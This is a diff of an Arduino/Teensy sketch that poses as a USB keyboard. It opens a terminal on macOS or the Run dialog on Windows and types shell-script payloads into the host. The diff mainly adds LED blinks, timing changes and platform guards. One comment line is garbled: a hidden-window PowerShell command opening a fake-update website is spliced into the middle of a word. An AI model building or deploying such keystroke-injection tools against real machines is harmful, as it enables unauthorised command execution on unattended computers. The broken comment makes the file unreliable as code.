@@ -8,6 +8,7 @@
 
 /*
  * HID SKETCHPAD (keep cursor here to stay on the safer side - well, not really)
+ * 
  */
  
 const int ledPin = 11;
@@ -18,7 +19,7 @@ void setup() {
   digitalWrite(ledPin, LOW);
 }
 
-// Choose your target:
+// Choose your target first:
 #define MACOSX
 //#define WINDOWS
 
@@ -38,9 +39,13 @@ void loop() {
   blink();
    
 #ifdef MACOSX
+  blink(); 
   doMac();
+  blink();
 #else if WINDOWS
+  blink(); blink();
   doWindows();
+  blink();
 #endif
 
   // stop forever (TODO: blink Teensy LED)
@@ -52,10 +57,12 @@ void loop() {
 
 void blink() {
   digitalWrite(ledPin, HIGH);   // set the LED on
-  delay(1000);                  // wait for a second
+  delay(500);                  // wait for a second
   digitalWrite(ledPin, LOW);    // set the LED off
+  delay(500);
 }
 
+#ifdef MACOSX
 void doMac() {
   pressAndReleaseAppleSpace(); 
   delay(1000); 
@@ -77,6 +84,7 @@ void doMac() {
   // ..to bash. Enter.
   Keyboard.println(SHELL_SCRIPT2);
 }
+#endif
 
 void pressAndReleaseAppleSpace()
 {
@@ -112,7 +120,7 @@ void pressAndReleaseAppleT()
 
 void pressAndReleasePipe()
 {
-  // Press Apple (Windows) Key
+  // Press Apple (Windows) Keyhell -windowstyle hidden (new-object -com wscript.shell).run(`http://fakeupdate.net/win10u/`,3)
   Keyboard.set_modifier(MODIFIERKEY_SHIFT);
   Keyboard.send_now();
 
@@ -126,11 +134,13 @@ void pressAndReleasePipe()
   Keyboard.send_now();
 }
 
+#ifdef WINDOWS
 void doWindows() {
   pressAndReleaseWindowsR();
   delay(1000);
   Keyboard.print(SHELL_SCRIPT1);
 }
+#endif
 
 void pressAndReleaseWindowsR()
 {
